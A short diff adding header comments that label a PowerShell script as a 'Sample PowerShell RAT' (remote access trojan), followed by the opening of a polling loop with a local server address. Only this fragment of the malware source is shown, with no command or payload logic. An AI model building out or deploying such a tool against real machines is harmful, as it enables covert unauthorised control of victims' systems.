@@ -1,3 +1,8 @@
+# Sample PowerShell RAT
+# Casey Smith
+# 06-04-2014
+# 
+
 while($true)
 {
 $server = "127.0.0.1:8081"
